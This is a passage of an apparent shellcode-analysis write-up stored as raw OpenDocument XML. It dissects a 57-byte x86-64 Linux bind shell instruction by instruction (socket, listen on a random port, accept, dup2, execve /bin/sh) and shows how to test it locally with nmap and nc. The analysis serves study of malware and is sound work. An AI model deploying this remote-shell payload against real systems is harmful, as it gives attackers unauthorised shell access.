      <text:p text:style-name="P4"><text:s/><text:span text:style-name="T50">&lt;+11&gt; </text:span><text:s/>mov <text:s text:c="3"/>al,0x29 </text:p>
      <text:p text:style-name="P4"><text:s/><text:span text:style-name="T50">&lt;+13&gt; </text:span>syscall </text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33"><draw:rect text:anchor-type="paragraph" draw:z-index="2" draw:style-name="gr1" draw:text-style-name="P86" svg:width="1.3953in" svg:height="0.4886in" svg:x="-0.1126in" svg:y="0.1665in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P34"><text:span text:style-name="T35">&lt;+0&gt;</text:span><text:span text:style-name="T30"> </text:span><text:span text:style-name="T31">xor <text:s/>rsi , rsi <text:s text:c="6"/></text:span><text:span text:style-name="T21">this instructions zeroed rsi , rax and rdx register </text:span></text:p>
      <text:p text:style-name="P34"><text:span text:style-name="T35">&lt;+3&gt; </text:span><text:span text:style-name="T31">mul rsi </text:span><text:span text:style-name="T30"><text:tab/><text:tab/></text:span><text:span text:style-name="T21">mul instruction multiply </text:span><text:span text:style-name="T40">rax </text:span><text:span text:style-name="T21">by a register or a memory in this case rsi</text:span></text:p>
      <text:p text:style-name="P68"><text:span text:style-name="T31"><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T5">rsi </text:span><text:span text:style-name="T31">is set to zero , because result is stored to </text:span><text:span text:style-name="T5">rax:rdx</text:span><text:span text:style-name="T31"> multiply by zero zeroed </text:span><text:span text:style-name="T5">rax , rdx </text:span><text:span text:style-name="T31">register .</text:span></text:p>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P65"><draw:rect text:anchor-type="paragraph" draw:z-index="4" draw:style-name="gr1" draw:text-style-name="P86" svg:width="1.5122in" svg:height="1.1642in" svg:x="0.0035in" svg:y="0.0854in"><text:p/></draw:rect><text:span text:style-name="T31"> </text:span><text:span text:style-name="T30"><text:tab/></text:span></text:p>
      <text:p text:style-name="P35"><text:s/><text:span text:style-name="T35">&lt;+6&gt;i</text:span><text:span text:style-name="T30">nc <text:s text:c="3"/>esi <text:s text:c="5"/><text:tab/></text:span><text:span text:style-name="T20">We see a syscall and the number is 0x29 <text:s/>(41) , syscall 41 is the socket syscall <text:s text:c="4"/></text:span><text:span text:style-name="T35">&lt;+8&gt;</text:span><text:span text:style-name="T30"> push <text:s text:c="2"/>0x2 </text:span></text:p>
      <text:p text:style-name="P9"><text:s/><text:span text:style-name="T50">&lt;+10&gt;</text:span>pop <text:s text:c="3"/>rdi </text:p>
      <text:p text:style-name="P9"><text:s/><text:span text:style-name="T50">&lt;+11&gt;</text:span> mov al,0x29 </text:p>
      <text:p text:style-name="P9"><text:s/><text:span text:style-name="T50">&lt;+13&gt; </text:span>syscall </text:p>
      <text:p text:style-name="P67"/>
      <text:p text:style-name="P40"><text:span text:style-name="T15">p</text:span><text:span text:style-name="T14">rototype of socket function :</text:span></text:p>
      <text:p text:style-name="P66"/>
      <text:p text:style-name="P66"><draw:rect text:anchor-type="paragraph" draw:z-index="5" draw:style-name="gr1" draw:text-style-name="P86" svg:width="3.2213in" svg:height="0.3406in" svg:x="0.0035in" svg:y="0.0854in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P36"><text:span text:style-name="T14"><text:s text:c="2"/></text:span><text:span text:style-name="T30">int socket(int domain, int type, int protocol);</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P58">Description get by the manual :</text:p>
      <text:p text:style-name="P47"/>
      <text:p text:style-name="P47"><draw:rect text:anchor-type="paragraph" draw:z-index="6" draw:style-name="gr1" draw:text-style-name="P86" svg:width="5.1634in" svg:height="0.4453in" svg:x="0.0035in" svg:y="0.0854in"><text:p/></draw:rect><text:tab/></text:p>
      <text:p text:style-name="P66"><text:span text:style-name="T30"><text:s/></text:span><text:span text:style-name="T39">socket() creates an endpoint for communication and returns a descriptor. </text:span></text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P50"><text:s/></text:p>
      <text:p text:style-name="P69"><text:span text:style-name="T4">rdi</text:span><text:span text:style-name="T30"> take the domain name value , in this case “ip” , value of ip is </text:span><text:span text:style-name="T32">2 </text:span><text:span text:style-name="T30">(you can </text:span><text:span text:style-name="T33">grab</text:span><text:span text:style-name="T30"> this value </text:span><text:span text:style-name="T33">in </text:span><text:span text:style-name="T30">python </text:span><text:span text:style-name="T33">using socket </text:span><text:span text:style-name="T34">library </text:span><text:span text:style-name="T30">)</text:span></text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P38"><text:span text:style-name="T30">rsi </text:span><text:span text:style-name="T17">take the value of the socket type , in this case AF_INET , value from AF_INET is </text:span><text:span text:style-name="T18">1</text:span><text:span text:style-name="T17"> </text:span></text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P38"><text:span text:style-name="T30">rdx</text:span><text:span text:style-name="T17"> take the protocol value , in this case tcp , value of tcp is 0 .</text:span></text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P39"><text:span text:style-name="T30">rax</text:span><text:span text:style-name="T17"> return the socket descriptor (int) , </text:span><text:span text:style-name="T19">usually int sockfd (socket file descriptor)</text:span></text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P60">finally the function call look-like :</text:p>
      <text:p text:style-name="P60"/>
      <text:p text:style-name="P48"><draw:rect text:anchor-type="paragraph" draw:z-index="7" draw:style-name="gr1" draw:text-style-name="P86" svg:width="4.6634in" svg:height="0.3406in" svg:x="0.0035in" svg:y="0.0854in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P37"><draw:custom-shape text:anchor-type="paragraph" draw:z-index="8" draw:style-name="gr2" svg:width="0.163in" svg:height="0.1398in" svg:x="0.5736in" svg:y="0.01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7"> <text:s/></text:span><text:span text:style-name="T30"><text:s/>“</text:span><text:span text:style-name="T32">rax” </text:span><text:span text:style-name="T30"><text:s text:c="6"/>socket(“</text:span><text:span text:style-name="T32">rdi = 2” </text:span><text:span text:style-name="T30">, “</text:span><text:span text:style-name="T32">rsi = 1” </text:span><text:span text:style-name="T30">, “</text:span><text:span text:style-name="T32">rdx = 0”</text:span><text:span text:style-name="T30">); <text:s text:c="27"/></text:span></text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"><draw:rect text:anchor-type="paragraph" draw:z-index="9" draw:style-name="gr1" draw:text-style-name="P86" svg:width="1.6988in" svg:height="1.3953in" svg:x="0.3283in" svg:y="0.0535in"><text:p/></draw:rect><text:soft-page-break/></text:p>
      <text:p text:style-name="P42"><text:s text:c="3"/><text:tab/><text:span text:style-name="T8">&lt;+15&gt;</text:span><text:span text:style-name="T50"> </text:span><text:span text:style-name="T7">push <text:s text:c="2"/>rdx <text:s text:c="11"/></text:span></text:p>
      <text:p text:style-name="P5"><text:s text:c="2"/><text:tab/><text:span text:style-name="T50">&lt;+16&gt;</text:span>pop <text:s text:c="3"/>rsi </text:p>
      <text:p text:style-name="P5"><text:s text:c="2"/><text:tab/><text:span text:style-name="T50">&lt;+17&gt;</text:span>push <text:s text:c="2"/>rax <text:tab/> <text:s text:c="4"/><text:span text:style-name="T23">we see a syscall , number 0x32(50) this is the listen syscall</text:span></text:p>
      <text:p text:style-name="P5"><text:s text:c="2"/><text:tab/><text:span text:style-name="T50">&lt;+18&gt;</text:span>pop <text:s text:c="3"/>rdi </text:p>
      <text:p text:style-name="P5"><text:tab/><text:span text:style-name="T50">&lt;+19&gt;</text:span>mov <text:s text:c="3"/>al,0x32 </text:p>
      <text:p text:style-name="P5"><text:s text:c="3"/><text:tab/><text:span text:style-name="T50">&lt;+21&gt;</text:span>syscall </text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P10"><text:span text:style-name="T22">Listen </text:span><text:span text:style-name="T25">function </text:span><text:span text:style-name="T22">prototype is :</text:span> </text:p>
      <text:p text:style-name="P10"><draw:rect text:anchor-type="paragraph" draw:z-index="10" draw:style-name="gr1" draw:text-style-name="P86" svg:width="2.5823in" svg:height="0.4213in" svg:x="0.3283in" svg:y="0.0535in"><text:p/></draw:rect><text:tab/></text:p>
      <text:p text:style-name="P10"><text:tab/> int listen(int sockfd, int backlog);</text:p>
      <text:p text:style-name="P10"><text:tab/></text:p>
      <text:p text:style-name="P10"><text:tab/><text:span text:style-name="T47">sockfd : </text:span><text:span text:style-name="T24">is the value returned by the previous socket call </text:span></text:p>
      <text:p text:style-name="P53"/>
      <text:p text:style-name="P10"><text:span text:style-name="T24"><text:tab/></text:span><text:span text:style-name="T47">backlog: </text:span><text:span text:style-name="T24">supplied by the value of max queued connection to sockfd </text:span></text:p>
      <text:p text:style-name="P53"/>
      <text:p text:style-name="P52">finally the syscall look-like this </text:p>
      <text:p text:style-name="P53"/>
      <text:p text:style-name="P10"><draw:rect text:anchor-type="paragraph" draw:z-index="11" draw:style-name="gr1" draw:text-style-name="P86" svg:width="3.2217in" svg:height="0.4213in" svg:x="0.3283in" svg:y="0.0535in"><text:p/></draw:rect><draw:custom-shape text:anchor-type="paragraph" draw:z-index="12" draw:style-name="gr2" svg:width="0.163in" svg:height="0.1398in" svg:x="0.9693in" svg:y="0.18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9"/><text:tab/></text:p>
      <text:p text:style-name="P11"><text:tab/><text:span text:style-name="T41">“rax” <text:s text:c="6"/>socket(“rdi = sockfd”, “rsi = 0” );</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P52">You can see , the author do not use bind method , if you execute this shellcode , he get a randomly port , using netstat two times and execute to times you can see what happens</text:p>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P52">first execution :</text:p>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P12"><draw:rect text:anchor-type="paragraph" draw:z-index="13" draw:style-name="gr1" draw:text-style-name="P86" svg:width="6.9768in" svg:height="1.5815in" svg:x="-0.1126in" svg:y="0.0209in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P19">Active Internet connections (servers and established) </text:p>
      <text:p text:style-name="P19">Proto Recv-Q Send-Q Local Address <text:s text:c="10"/>Foreign Address <text:s text:c="8"/>State <text:s text:c="6"/>Timer </text:p>
      <text:p text:style-name="P72">tcp <text:s text:c="7"/>0 <text:s text:c="5"/>0 0.0.0.0:58656 <text:s text:c="12"/>0.0.0.0:* <text:s text:c="23"/>LISTEN <text:s text:c="5"/>off (0.00/0/0) </text:p>
      <text:p text:style-name="P19">tcp <text:s text:c="7"/>0 <text:s text:c="5"/>0 127.0.0.1:41646 <text:s text:c="8"/>127.0.0.1:41301 <text:s text:c="8"/>TIME_WAIT <text:s text:c="2"/>timewait (32.51/0/0) </text:p>
      <text:p text:style-name="P19">udp <text:s text:c="5"/>0 <text:s text:c="5"/>0 0.0.0.0:68 <text:s text:c="18"/>0.0.0.0:* <text:s text:c="23"/>off (0.00/0/0) </text:p>
      <text:p text:style-name="P19">udp <text:s text:c="5"/>0 <text:s text:c="5"/>0 0.0.0.0:57689 <text:s text:c="12"/>0.0.0.0:* <text:s text:c="23"/>off (0.00/0/0) </text:p>
      <text:p text:style-name="P19">udp6 <text:s text:c="3"/>0 <text:s text:c="5"/>0 :::53009 <text:s text:c="20"/>:::* <text:s text:c="32"/>off (0.00/0/0) </text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P54"><text:span text:style-name="T41">s</text:span>econd execution:</text:p>
      <text:p text:style-name="P54"><draw:rect text:anchor-type="paragraph" draw:z-index="14" draw:style-name="gr1" draw:text-style-name="P86" svg:width="6.9768in" svg:height="1.5933in" svg:x="-0.1929in" svg:y="0.1035in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P19">Active Internet connections (servers and established) </text:p>
      <text:p text:style-name="P19">Proto Recv-Q Send-Q Local Address <text:s text:c="10"/>Foreign Address <text:s text:c="8"/>State <text:s text:c="6"/>Timer </text:p>
      <text:p text:style-name="P71"><text:span text:style-name="T41">tcp <text:s text:c="7"/>0 <text:s text:c="5"/>0 0.0.0.0:</text:span>35274<text:span text:style-name="T41"> <text:s text:c="12"/>0.0.0.0:* <text:s text:c="23"/>LISTEN <text:s text:c="5"/>off (0.00/0/0) </text:span></text:p>
      <text:p text:style-name="P19">tcp <text:s text:c="7"/>0 <text:s text:c="5"/>0 127.0.0.1:41646 <text:s text:c="8"/>127.0.0.1:41301 <text:s text:c="8"/>TIME_WAIT <text:s text:c="2"/>timewait (32.51/0/0) </text:p>
      <text:p text:style-name="P19">udp <text:s text:c="5"/>0 <text:s text:c="5"/>0 0.0.0.0:68 <text:s text:c="18"/>0.0.0.0:* <text:s text:c="23"/>off (0.00/0/0) </text:p>
      <text:p text:style-name="P19">udp <text:s text:c="5"/>0 <text:s text:c="5"/>0 0.0.0.0:57689 <text:s text:c="12"/>0.0.0.0:* <text:s text:c="23"/>off (0.00/0/0) </text:p>
      <text:p text:style-name="P19">udp6 <text:s text:c="3"/>0 <text:s text:c="5"/>0 :::53009 <text:s text:c="20"/>:::* <text:s text:c="32"/>off (0.00/0/0) </text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P54"><text:span text:style-name="T41">T</text:span>o find and connect to the shellcode , the attacker must use nmap or another scanner to find the port opened by the shellcode </text:p>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P44"><draw:rect text:anchor-type="paragraph" draw:z-index="29" draw:style-name="gr1" draw:text-style-name="P86" svg:width="1.9776in" svg:height="0.535in" svg:x="0.3055in" svg:y="-0.0346in"><text:p/></draw:rect><text:soft-page-break/> <text:s text:c="2"/><text:span text:style-name="T7"><text:s text:c="6"/></text:span><text:span text:style-name="T10">&lt;+23&gt;:<text:tab/>mov <text:s text:c="3"/>al,0x2b </text:span></text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>&lt;+25&gt;:<text:tab/>syscall <text:tab/><text:tab/><text:span text:style-name="T16">wee see a syscall 0x2b (43) , accept syscall</text:span></text:p>
      <text:p text:style-name="P79"/>
      <text:p text:style-name="P81">prototype of the function accept given by “man 2 accept” <text:s/>command :</text:p>
      <text:p text:style-name="P81"><draw:rect text:anchor-type="paragraph" draw:z-index="30" draw:style-name="gr1" draw:text-style-name="P86" svg:width="4.8953in" svg:height="0.3142in" svg:x="-0.0193in" svg:y="0.1866in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P80">int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);</text:p>
      <text:p text:style-name="P84"/>
      <text:p text:style-name="P81">Part of description <text:s/>of the function accept given by “man 2 accept” <text:s/>command :</text:p>
      <text:p text:style-name="P81"><draw:rect text:anchor-type="paragraph" draw:z-index="31" draw:style-name="gr1" draw:text-style-name="P86" svg:width="5.8717in" svg:height="1.4189in" svg:x="-0.0193in" svg:y="0.1299in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P81"><text:s/>The <text:s/>accept() <text:s/>system <text:s/>call <text:s/>is used with connection-based socket types </text:p>
      <text:p text:style-name="P81"><text:s text:c="7"/>(SOCK_STREAM, <text:s/>SOCK_SEQPACKET). <text:s text:c="2"/>It <text:s/>extracts <text:s/>the <text:s/>first <text:s text:c="2"/>connection </text:p>
      <text:p text:style-name="P81"><text:s text:c="7"/>request <text:s/>on <text:s/>the queue of pending connections for the listening socket, </text:p>
      <text:p text:style-name="P81"><text:s text:c="7"/>sockfd, creates a new connected socket, and returns a new file descrip‐ </text:p>
      <text:p text:style-name="P81"><text:s text:c="7"/>tor <text:s/>referring <text:s/>to that socket. <text:s/>The newly created socket is not in the </text:p>
      <text:p text:style-name="P81"><text:s text:c="7"/>listening state. <text:s/>The original socket <text:s/>sockfd <text:s/>is <text:s/>unaffected <text:s/>by <text:s/>this </text:p>
      <text:p text:style-name="P81"><text:s text:c="7"/>call. </text:p>
      <text:p text:style-name="P82"/>
      <text:p text:style-name="P70"><text:span text:style-name="T30">Wee can see , the socket function is really not properly feed by the code , (no space allocated to receive </text:span><text:span text:style-name="T52">*addr</text:span><text:span text:style-name="T30"> and </text:span><text:span text:style-name="T52">*addrlen</text:span><text:span text:style-name="T30">), this is intentionally , overwrite the stack <text:s/>(certainly no matter of the value overwritten) </text:span></text:p>
      <text:p text:style-name="P76"><text:span text:style-name="T56">r</text:span><text:span text:style-name="T55">emember how is filled </text:span><text:span text:style-name="T57">*addr </text:span><text:span text:style-name="T42">in assembly (bind shell shellcode)</text:span></text:p>
      <text:p text:style-name="P77"/>
      <text:p text:style-name="P77"><text:s/></text:p>
      <text:p text:style-name="P77"><draw:rect text:anchor-type="paragraph" draw:z-index="34" draw:style-name="gr3" draw:text-style-name="P86" svg:width="1.9657in" svg:height="0.9969in" svg:x="-0.0457in" svg:y="0.1083in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P78"><draw:custom-shape text:anchor-type="paragraph" draw:z-index="35" draw:style-name="gr2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10 <text:tab/> <text:s text:c="26"/>Buffer for *addr</text:p>
      <text:p text:style-name="P76"><text:span text:style-name="T56">m</text:span><text:span text:style-name="T55">ov rsi , rsp</text:span></text:p>
      <text:p text:style-name="P76"><draw:custom-shape text:anchor-type="paragraph" draw:z-index="32" draw:style-name="gr2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6">mov dword [rsp-4], eax <text:s text:c="12"/></text:span><text:span text:style-name="T55">rsi + 4 (address)</text:span></text:p>
      <text:p text:style-name="P75"><draw:custom-shape text:anchor-type="paragraph" draw:z-index="33" draw:style-name="gr2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6">mov word [rsp-6], 0x5c11 <text:s text:c="8"/></text:span><text:span text:style-name="T30">rsi + 2 (port) in this case port 4444 in network byte order <text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>thi</text:span><text:span text:style-name="T37">s </text:span><text:span text:style-name="T30">shellcode value is </text:span><text:span text:style-name="T38">the random value </text:span></text:p>
      <text:p text:style-name="P85"/>
      <text:p text:style-name="P75"><text:span text:style-name="T6">*addrlen </text:span><text:span text:style-name="T38">point to the size of value received by </text:span><text:span text:style-name="T6">*addr</text:span></text:p>
      <text:p text:style-name="P82"/>
      <text:p text:style-name="P83">Next couple of instructions :</text:p>
      <text:p text:style-name="P82"><draw:rect text:anchor-type="paragraph" draw:z-index="15" draw:style-name="gr1" draw:text-style-name="P86" svg:width="2.4894in" svg:height="1.4886in" svg:x="0.3055in" svg:y="0.1091in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T7"><text:tab/></text:span><text:span text:style-name="T9">&lt;+27&gt;</text:span><text:span text:style-name="T7">push <text:s text:c="2"/>rdi </text:span></text:p>
      <text:p text:style-name="P7"><text:s text:c="3"/><text:tab/><text:span text:style-name="T51">&lt;+28&gt;</text:span>pop <text:s text:c="3"/>rsi <text:tab/><text:tab/> <text:s text:c="10"/></text:p>
      <text:p text:style-name="P6"><text:tab/><text:span text:style-name="T51">&lt;+29&gt;</text:span>xchg <text:s text:c="2"/>rdi,rax </text:p>
      <text:p text:style-name="P6"><text:s/><text:tab/><text:span text:style-name="T51">&lt;+31&gt; </text:span>dec <text:s text:c="3"/>esi <text:s text:c="3"/><text:span text:style-name="T48">(code + 31)</text:span></text:p>
      <text:p text:style-name="P6"><text:s text:c="2"/><text:tab/><text:span text:style-name="T58">&lt;+33&gt;</text:span>mov <text:s text:c="3"/>al,0x21 </text:p>
      <text:p text:style-name="P7"><text:s text:c="2"/><text:tab/><text:span text:style-name="T58">&lt;+35&gt;</text:span>syscall <text:tab/><text:tab/><text:tab/><text:tab/><text:span text:style-name="T25">another syscall , number 0x21 (33) dup2 syscall </text:span></text:p>
      <text:p text:style-name="P7"><text:tab/><text:span text:style-name="T58">&lt;+37&gt; </text:span>jne 0x60099f &lt;code+31&gt; </text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P55">dup2 function prototype : </text:p>
      <text:p text:style-name="P55"><draw:rect text:anchor-type="paragraph" draw:z-index="16" draw:style-name="gr1" draw:text-style-name="P86" svg:width="2.2441in" svg:height="0.3606in" svg:x="-0.0311in" svg:y="0.1055in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P14"><text:s/>int dup2(int oldfd, int newfd);</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><draw:rect text:anchor-type="paragraph" draw:z-index="17" draw:style-name="gr1" draw:text-style-name="P86" svg:width="1.163in" svg:height="0.5224in" svg:x="-0.0311in" svg:y="0.1354in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T58">&lt;+27&gt;</text:span>push rdi <text:s/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T58">&lt;+28 <text:s text:c="2"/></text:span>pop rsi <text:s text:c="11"/><text:span text:style-name="T22">mov value 2 <text:s/>to rsi </text:span></text:p>
      <text:p text:style-name="P55"/>
      <text:p text:style-name="P55"/>
      <text:p text:style-name="P61"><draw:rect text:anchor-type="paragraph" draw:z-index="18" draw:style-name="gr1" draw:text-style-name="P86" svg:width="1.5004in" svg:height="0.287in" svg:x="-0.0311in" svg:y="0.1354in"><text:p/></draw:rect><text:soft-page-break/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T58">&lt;+29&gt; </text:span>xchg <text:s text:c="2"/>rdi,rax <text:s text:c="3"/><text:span text:style-name="T25">mov sokfd value to rdi (oldfd)</text:span><text:span text:style-name="T22"> </text:span></text:p>
      <text:p text:style-name="P61"/>
      <text:p text:style-name="P15"><text:span text:style-name="T42">rsi </text:span><text:span text:style-name="T22">take the value of newfd , in this case dup2 is called </text:span><text:span text:style-name="T28">trough the loop </text:span><text:span text:style-name="T22">tree times , each time for duplicate in first in this case stderr , second times stdout , third times stdin .</text:span></text:p>
      <text:p text:style-name="P56">At the end <text:span text:style-name="T11">rsi</text:span><text:span text:style-name="T12"> </text:span>reach 0 and the zero flags is set , shellcode can continue next couple of instructions .</text:p>
      <text:p text:style-name="P56"/>
      <text:p text:style-name="P57">Syscall look-like this </text:p>
      <text:p text:style-name="P57"><draw:rect text:anchor-type="paragraph" draw:z-index="21" draw:style-name="gr1" draw:text-style-name="P86" svg:width="2.1516in" svg:height="0.3606in" svg:x="-0.0311in" svg:y="0.1055in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P15"><draw:custom-shape text:anchor-type="paragraph" draw:z-index="22" draw:style-name="gr2" svg:width="0.1516in" svg:height="0.1051in" svg:x="0.5154in" svg:y="0.064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“<text:span text:style-name="T49">rax” </text:span><text:s text:c="7"/>dup2(“<text:span text:style-name="T49">rdi”</text:span>, “<text:span text:style-name="T49">rsi”</text:span>); <text:s text:c="2"/></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P51">Next couple of instructions:</text:p>
      <text:p text:style-name="P61"><draw:rect text:anchor-type="paragraph" draw:z-index="19" draw:style-name="gr1" draw:text-style-name="P86" svg:width="2.8378in" svg:height="1.5598in" svg:x="0.0035in" svg:y="0.1035in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T53"><text:s/></text:span><text:span text:style-name="T42"><text:s/></text:span><text:span text:style-name="T45">&lt;+39&gt;</text:span><text:span text:style-name="T27"> </text:span>push <text:s text:c="2"/>rdx <text:tab/><text:tab/><text:tab/><text:tab/> <text:s text:c="2"/><text:span text:style-name="T49">rdx = 0</text:span></text:p>
      <text:p text:style-name="P7"><text:s text:c="2"/><text:span text:style-name="T58">&lt;+40&gt; </text:span>movabs rdi,0x68732f6e69622f2f <text:s text:c="6"/><text:span text:style-name="T49">mov string '//bin/sh' in reverse order in rdi</text:span></text:p>
      <text:p text:style-name="P7"><text:s text:c="2"/><text:span text:style-name="T58">&lt;+50&gt;</text:span>push <text:s text:c="2"/>rdi <text:s text:c="42"/></text:p>
      <text:p text:style-name="P7"><text:s text:c="2"/><text:span text:style-name="T58">&lt;+51&gt;</text:span>push <text:s text:c="2"/>rsp <text:s text:c="96"/></text:p>
      <text:p text:style-name="P7"><text:s text:c="2"/><text:span text:style-name="T58">&lt;+52&gt; </text:span>pop <text:s text:c="3"/>rdi </text:p>
      <text:p text:style-name="P7"><text:s/><text:span text:style-name="T58">&lt;+53&gt;</text:span> mov <text:s text:c="3"/>al,0x3b <text:tab/><text:tab/><text:tab/> <text:s text:c="11"/><text:span text:style-name="T49">this is THE syscall (execve)</text:span></text:p>
      <text:p text:style-name="P24"><text:s text:c="2"/><text:span text:style-name="T58">&lt;+55&gt; </text:span>syscall </text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"><draw:rect text:anchor-type="paragraph" draw:z-index="20" draw:style-name="gr1" draw:text-style-name="P86" svg:width="1.2098in" svg:height="0.8004in" svg:x="0.0382in" svg:y="0.1035in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T42"><text:s text:c="2"/></text:span><text:span text:style-name="T45">&lt;+50&gt;</text:span><text:span text:style-name="T43">push rdi</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T43"><text:s text:c="2"/></text:span><text:span text:style-name="T45">&lt;+51&gt;</text:span><text:span text:style-name="T43">push rsp <text:s text:c="15"/></text:span><text:span text:style-name="T45">←</text:span><text:span text:style-name="T43"> </text:span><text:span text:style-name="T26">is equivalent to push rdi , mov rdi , rsp</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T43"><text:s text:c="2"/></text:span><text:span text:style-name="T45">&lt;+52&gt;</text:span><text:span text:style-name="T43">pop rdi</text:span><text:span text:style-name="T42"><text:tab/></text:span></text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P57">Syscall look-like this </text:p>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P57"><draw:rect text:anchor-type="paragraph" draw:z-index="23" draw:style-name="gr1" draw:text-style-name="P86" svg:width="3.7559in" svg:height="0.3606in" svg:x="-0.0311in" svg:y="0.1055in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T42"><text:s/></text:span><text:span text:style-name="T43">execve <text:s/></text:span><text:span text:style-name="T42">(“</text:span><text:span text:style-name="T43">rdi</text:span><text:span text:style-name="T45">&lt;&lt;//bin/sh&gt;&gt;</text:span><text:span text:style-name="T43">”</text:span><text:span text:style-name="T42">, “</text:span><text:span text:style-name="T43">rsi = 0” , “rdx = 0” </text:span><text:span text:style-name="T42">);</text:span></text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P64">Finally , how to test the shellcode:</text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P57">first step:</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P20"><text:span text:style-name="T42"><text:tab/></text:span><text:span text:style-name="T29">Execute the shellcode </text:span></text:p>
      <text:p text:style-name="P31"><draw:rect text:anchor-type="paragraph" draw:z-index="24" draw:style-name="gr1" draw:text-style-name="P86" svg:width="2.2098in" svg:height="0.6862in" svg:x="0.422in" svg:y="0.1591in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P22"><text:span text:style-name="T42"><text:tab/></text:span><text:span text:style-name="T43"># ./shellcode</text:span></text:p>
      <text:p text:style-name="P30"><text:tab/>Shellcode Length: <text:s/>57 </text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P20"><text:span text:style-name="T42"><text:s text:c="10"/></text:span><text:span text:style-name="T29">Seek the opened port with nmap :</text:span></text:p>
      <text:p text:style-name="P57"><draw:rect text:anchor-type="paragraph" draw:z-index="25" draw:style-name="gr1" draw:text-style-name="P86" svg:width="1.8488in" svg:height="0.4421in" svg:x="0.4457in" svg:y="0.0736in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T42"><text:tab/>#./nmap -sS target -p- <text:s text:c="13"/></text:span><text:span text:style-name="T29">in this case target = local host </text:span></text:p>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P62"><text:s text:c="11"/>output of nmap:</text:p>
      <text:p text:style-name="P62"><draw:rect text:anchor-type="paragraph" draw:z-index="26" draw:style-name="gr1" draw:text-style-name="P86" svg:width="5.2094in" svg:height="1.8276in" svg:x="-0.0661in" svg:y="0.0736in"><text:p/></draw:rect><text:soft-page-break/></text:p>
      <text:p text:style-name="P28"><text:tab/>Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-20 10:00 CEST </text:p>
      <text:p text:style-name="P28">Nmap scan report for localhost (127.0.0.1) </text:p>
      <text:p text:style-name="P28">Host is up (0.0000080s latency). </text:p>
      <text:p text:style-name="P28">Not shown: 65534 closed ports </text:p>
      <text:p text:style-name="P28">PORT <text:s text:c="5"/>STATE SERVICE </text:p>
      <text:p text:style-name="P73">35588/tcp open <text:s/>unknown </text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28">Nmap done: 1 IP address (1 host up) scanned in 2.26 seconds </text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P63"><text:tab/>connect to the shellcode via nc:</text:p>
      <text:p text:style-name="P28"><draw:rect text:anchor-type="paragraph" draw:z-index="27" draw:style-name="gr1" draw:text-style-name="P86" svg:width="1.4768in" svg:height="0.3606in" svg:x="0.3992in" svg:y="0.1071in"><text:p/></draw:rect><text:tab/></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T42"><text:tab/>#./</text:span><text:span text:style-name="T44">nc target 35588</text:span></text:p>
      <text:p text:style-name="P32"/>
